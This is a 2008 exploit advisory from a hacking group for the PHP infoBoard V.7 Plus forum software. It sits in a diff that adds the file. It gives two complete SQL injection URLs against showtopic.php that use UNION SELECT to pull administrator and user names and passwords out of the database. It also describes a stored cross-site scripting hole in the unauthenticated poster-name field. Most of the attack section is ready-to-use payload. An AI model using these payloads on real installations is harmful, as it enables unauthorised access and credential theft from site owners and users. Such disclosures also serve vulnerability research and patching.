@@ -1,0 +1,57 @@
+==========================================================
+  PHP infoBoard V.7 Plus Multiple Remote Vulnerabilities
+==========================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+AUTHOR : CWH Underground
+DATE   : 25 September 2008
+SITE   : cwh.citec.us
+
+
+#####################################################
+APPLICATION : PHP infoBoard V.7 Plus
+VERSION     : v.7
+VENDOR      : http://cannot.info/phpinfoboard
+DOWNLOAD    : http://cannot.info/lib/dw/plus7.zip
+#####################################################
+
+-- Remote SQL Injection ---
+
+[+]http://[Target]/[path]/showtopic.php?idcat=-1'/**/UNION/**/SELECT/**/1,2,3,4,concat(info_name,0x3a,0x3a,0x3a,info_pass),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30/**/FROM/**/[prefix]info_admin--&showpage=10
+[+]http://[Target]/[path]/showtopic.php?idcat=-1'/**/UNION/**/SELECT/**/1,2,3,4,concat(info_name,0x3a,0x3a,0x3a,info_pass),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30/**/FROM/**/[prefix]info_user--&showpage=10
+
+Note: [prefix] is a prefix of table names that an administrator assigns it when he sets up PHP infoBoard.
+
+
+-- Strore XSS --
+
+At page http://[Target]/[path]/?action=newtopic&idcat=[number]
+
+This page is used to add new topics and there is a feild "ª×èÍ" which is prepared for inserting poster's name.
+We can inject javascript into this feild as result in "Stored XSS". 
+
+Example code of vulnerable input feild:
+ª×èÍ</td><td width='125' height='25' align='left'><input  name='isname' type='text'  size='25' value='' />
+
+Note: 
+- [number] is a idcat  that an administrator assigns it (default is 1).
+- We can inject javascript into the feild when we do not log in to be a user of a PHP infoBoard.
+
+
+#####################################################################
+Greetz      : ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos
+Special Thx : asylu3, str0ke, citec.us, milw0rm.com
+#####################################################################
+
+# milw0rm.com [2008-09-25]
